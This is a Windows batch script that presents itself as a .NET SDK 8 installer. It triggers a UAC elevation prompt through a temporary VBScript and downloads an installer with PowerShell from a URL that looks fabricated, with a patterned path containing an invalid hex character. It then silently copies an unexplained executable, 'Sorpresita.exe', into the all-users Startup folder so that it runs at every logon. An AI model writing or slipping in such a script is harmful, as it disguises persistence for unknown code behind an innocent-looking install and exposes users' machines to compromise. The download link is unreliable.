@echo off
:: BatchGotAdmin (Run as Admin code starts)
REM --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
:: BatchGotAdmin (Run as Admin code ends)

:: Download and install .NET SDK 8
echo Downloading .NET SDK 8...
powershell -Command "Invoke-WebRequest -Uri 'https://download.visualstudio.microsoft.com/download/pr/6c7d6f5a-4d3d-4c1d-9e3a-0d5a4a085e6d/3d5d6c6e7c8d9e0f1a2b3c4d5e6f7g8/dotnet-sdk-8.0.100-win-x64.exe' -OutFile 'dotnet-sdk-8.exe'"

echo Installing .NET SDK 8...
start /wait dotnet-sdk-8.exe /install /quiet /norestart

:: Add to startup for all users
echo Configuring startup entry...
copy "%~dp0Sorpresita.exe" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\" >nul

echo Operation completed successfully!
pause